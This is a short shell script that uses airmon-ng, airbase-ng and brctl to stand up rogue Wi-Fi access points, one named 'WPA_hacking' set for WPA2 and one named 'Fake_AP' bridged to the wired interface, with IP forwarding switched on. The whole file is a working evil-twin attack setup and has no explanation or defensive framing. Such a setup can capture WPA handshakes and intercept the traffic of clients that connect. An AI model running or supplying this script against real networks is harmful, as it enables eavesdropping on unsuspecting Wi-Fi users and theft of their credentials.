#!/bin/sh
airmon-ng start wlan0
airmon-ng
gnome-terminal -x airbase-ng --essid WPA_hacking -c 5 -Z 4 mon0
ifconfig at0
gnome-terminal -x airbase-ng -e Fake_AP -c 5 mon0
brctl addbr Fake_AP
brctl addif Fake_AP eth0
brctl addif Fake_AP at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
dhclient Fake_AP
echo 1 > /proc/sys/net/ipv4/ip_forward
